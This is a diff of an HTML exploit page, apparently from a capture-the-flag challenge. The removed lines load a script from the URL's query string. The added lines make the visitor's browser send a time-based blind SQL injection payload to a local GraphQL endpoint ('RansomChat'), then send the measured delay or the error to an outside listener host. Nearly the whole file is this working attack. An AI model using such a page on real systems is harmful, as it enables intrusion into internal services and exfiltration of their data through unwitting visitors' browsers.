@@ -1,20 +1,17 @@
 <html>
-  <head>
-    <script>
-      var url = window.location.href;
-      var q = url.split('?')[1];
-      var payload = q.split('=')[1];
-      
-      function test(payload) {
-        var script = document.createElement('script');
-        script.onerror = function() { console.log("Nope") }
-        script.onload = function() { console.log("Yeah") }
-        script.src = payload;
-        document.querySelector('head').appendChild(script);
-      }
-      test(payload)
-    </script>
-  </head>
-  <body>
-  </body>
+    <body>
+        <script>
+        var start = performance.now()
+        fetch(`http://127.0.0.1:1337/graphql?query=query {RansomChat(enc_id:"1f81b076-fffc-45cd-b7c3-c686b73aa6af' AND sleep(5)%3d'1"){id}}`, 
+        {
+            mode: "no-cors"
+        }
+        ).then(() => {
+            var time = performance.now() - start;
+            fetch("http://"+listener+"?time=" +"The+request+took+%d+ms."+time);
+        }).catch((error) => {
+            fetch("http://"+listener+"?error=" + error);
+        })
+        </script>
+    </body>
 </html>
